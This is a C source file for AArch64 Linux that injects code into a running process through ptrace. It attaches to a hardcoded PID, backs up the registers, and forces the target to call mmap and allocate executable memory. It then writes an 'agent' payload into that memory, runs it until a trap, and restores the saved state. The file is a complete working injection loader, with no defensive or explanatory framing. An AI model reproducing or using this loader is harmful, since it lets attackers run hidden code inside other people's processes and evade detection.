#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <asm/ptrace.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <linux/elf.h>
#include <stdint.h>
#include "agent.h"
#define PID 140011
#define CHECK(x) if ((x) == -1) { perror(#x); exit(1); }
#define NT_ARM_TLS 0x401 // Ptrace flag for AArch64 TLS register


int ptrace_poketext_write(long pid, long address, const unsigned char *payload, int payload_size) {      
    for (size_t i = 0; i < payload_size; i += sizeof(long)) {
        long chunk = 0;

        size_t remaining = payload_size - i;
        size_t copy_size = remaining < sizeof(long) ? remaining : sizeof(long);

        if (copy_size != sizeof(long)) {
            // read existing memory to avoid clobbering
            chunk = ptrace(PTRACE_PEEKTEXT, pid, address + i, NULL);
        }

        memcpy(&chunk, payload + i, copy_size);

        CHECK(ptrace(PTRACE_POKETEXT, pid, address + i, chunk));
    }
    return 0;
}


int main() {
    pid_t pid = PID;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return EXIT_FAILURE;
    }
    waitpid(pid, NULL, 0);

    struct user_pt_regs regs, backup;
    struct iovec iov;

    // 1. Backup General Purpose Registers (PC, SP, x0-x30)
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    CHECK(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));
    backup = regs;

    // 2. Backup Thread Local Storage Register (tpidr_el0)
    uint64_t tls_backup = 0;
    struct iovec tls_iov;
    tls_iov.iov_base = &tls_backup;
    tls_iov.iov_len = sizeof(tls_backup);
    if (ptrace(PTRACE_GETREGSET, pid, NT_ARM_TLS, &tls_iov) == -1) {
        perror("[-] Failed to backup TLS (Non-fatal)");
    }

    // mmap
    regs.regs[0] = 0;                      
    regs.regs[1] = agent_len;              
    regs.regs[2] = PROT_READ | PROT_EXEC;
    regs.regs[3] = MAP_PRIVATE | MAP_ANONYMOUS;
    regs.regs[4] = -1;                     
    regs.regs[5] = 0;                      
    regs.regs[8] = __NR_mmap;

    long original = ptrace(PTRACE_PEEKTEXT, pid, regs.pc, NULL);
    CHECK(ptrace(PTRACE_POKETEXT, pid, regs.pc, 0xd4000001)); // svc 0

    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
    CHECK(ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL));
    waitpid(pid, NULL, 0);

    CHECK(ptrace(PTRACE_POKETEXT, pid, regs.pc, original));

    ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov);
    void *mapped_addr = (void *)regs.regs[0];

    if ((long)mapped_addr < 0) {
        printf("[-] mmap failed: %ld\n", (long)mapped_addr);
        return -1;
    }

    // inject payload
    regs = backup;
    ptrace_poketext_write(pid, (long)mapped_addr, agent, agent_len);
    
    regs.pc = (unsigned long)mapped_addr;

    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));

    CHECK(ptrace(PTRACE_CONT, pid, NULL, NULL));

    // wait for payload
    int status;
    while (1) {
        waitpid(pid, &status, 0);
        
        // catch break point
        if (WIFSTOPPED(status)) {
            int sig = WSTOPSIG(status);
            if (sig == SIGTRAP) {
                break;
            }
            // Continue if stopped
            ptrace(PTRACE_CONT, pid, NULL, sig);
        } else if (WIFEXITED(status)) {
            return 0;
        }
    }

    // restore TLS
    if (tls_backup != 0) {
        CHECK(ptrace(PTRACE_SETREGSET, pid, NT_ARM_TLS, &tls_iov));
    }

    iov.iov_base = &backup;
    iov.iov_len = sizeof(backup);
    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));

    CHECK(ptrace(PTRACE_DETACH, pid, NULL, NULL));
    
    return 0;
}